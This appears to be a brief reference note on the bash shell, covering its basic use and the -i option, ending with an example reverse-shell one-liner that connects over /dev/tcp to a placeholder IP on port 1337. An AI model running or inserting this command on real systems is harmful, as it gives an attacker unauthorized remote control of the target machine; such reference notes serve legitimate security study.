**bash**, short for 'bourne again shell' is a Unix shell and command language.

## Usage 

	bash

Preceding any command with **bash** opens a shell.

## Notable Options

	-i

Makes the shell interactive

## Example

^de9bf6

The following command creates a reverse shell on a target machine in an interactive **bash**.

	bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/1337 0>&1
